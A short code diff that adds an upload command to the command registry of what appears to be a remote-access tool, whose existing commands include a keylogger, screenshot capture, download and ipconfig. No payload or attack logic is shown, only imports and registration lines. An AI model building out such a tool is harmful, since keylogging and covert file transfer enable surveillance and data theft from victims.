@@ -2,6 +2,7 @@ from .help import HelpCommand
 from .download import DownloadCommand
 from .ipconfig import IPConfigCommand
 from .keylogger import KeyloggerCommand
+from .upload import UploadCommand
 from .screenshot import ScreenshotCommand
 
 
@@ -13,6 +14,7 @@ class CommandRegistry:
         self.register(DownloadCommand())
         self.register(IPConfigCommand())
         self.register(KeyloggerCommand())
+        self.register(UploadCommand())
         self.register(ScreenshotCommand())
 
     def register(self, command):
